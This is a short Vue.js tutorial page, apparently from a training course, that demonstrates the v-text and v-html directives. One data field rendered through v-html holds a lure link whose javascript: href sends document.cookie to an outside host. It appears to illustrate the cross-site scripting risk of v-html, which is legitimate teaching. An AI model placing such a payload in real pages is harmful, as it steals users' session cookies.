<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Document</title>
  </head>

  <body>
    <div id="app">
      <div>你好，{{name}}</div>
      <div v-text="name"></div>
      <div v-html="str"></div>
      <div v-html="str2"></div>
    </div>
    <script src="../js/vue.js"></script>
    <script>
      new Vue({
        el: "#app",
        data: {
          name: "尚硅谷",
          str: "<h3>你好尚硅谷</h3>",
          str2: "<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>兄弟快来，优秀资源在此</a>",
        },
      });
    </script>
  </body>
</html>
